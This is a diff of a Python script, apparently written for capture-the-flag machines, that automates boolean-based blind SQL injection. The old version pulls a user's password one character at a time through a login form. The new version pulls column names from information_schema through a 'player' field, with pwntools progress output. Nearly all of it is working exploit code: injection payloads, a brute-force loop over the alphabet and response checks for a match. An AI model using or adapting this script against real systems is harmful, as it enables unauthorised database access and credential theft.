@@ -1,13 +1,13 @@
-import argparse
-import string
-import sys
+#!/usr/bin/env python3
 
+import string
+
+import pwn
 import requests
 
-URL = "http://challenge.localhost/"
-GREEN = "\033[0;32m"
+URL = "http://10.10.11.128"
 RED = "\033[0;31m"
-ENDCOLOR = "\033[0m"
+RESET = "\033[0m"
 
 
 def main():
@@ -16,42 +16,29 @@ def main():
     match = True
     index = 1
 
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-u", "--user", default="")
-    parser.add_argument("-t", "--table", default="")
-
-    args = parser.parse_args()
-
-    user = args.user
-    table = args.table
-
-    if user == "" or table == "":
-        print(f"[!] Usage: python {sys.argv[0]} -u <USER> -t <TABLE>")
-        sys.exit(-1)
-
-    print(f"\r\n{GREEN}[+] Password:{ENDCOLOR} {password}", end="")
-
     try:
-        while match:
-            print(f"\r{GREEN}[+] Password:{ENDCOLOR} {password}", end="")
-            for char in alphabet:
-                data = {
-                    "username": f"{user}",
-                    "password": f"nonexistant' OR SUBSTR((SELECT password FROM {table} WHERE username = '{user}'), {index}, 1) = '{char}'-- -",
-                }
-                r = requests.post(URL, data=data)
+        with pwn.log.progress("Current guess") as p:
+            while match:
+                p.status(f"{password}")
+                for char in alphabet:
+                    data = {
+                        "player": f"test'OR SUBSTRING((SELECT column_name FROM information_schema.columns where table_name='players' LIMIT 1,1), {index}, 1) = '{char}' -- -"
+                    }
+                    r = requests.post(URL, data=data)
 
-                # Condition for match
-                if r.status_code != 403:
-                    match = True
-                    password += char
-                    index += 1
-                    break
+                    # Condition for match
+                    if "ippsec" in r.text:
+                        match = True
+                        password += char
+                        index += 1
+                        break
 
-                match = False
+                    match = False
+
+            p.success(f"{password}")
 
     except KeyboardInterrupt:
-        print(f"\n\n{RED}[-]{ENDCOLOR} User Interrupted")
+        print(f"\n\n{RED}[-]{RESET} User Interrupted")
 
 
 if __name__ == "__main__":
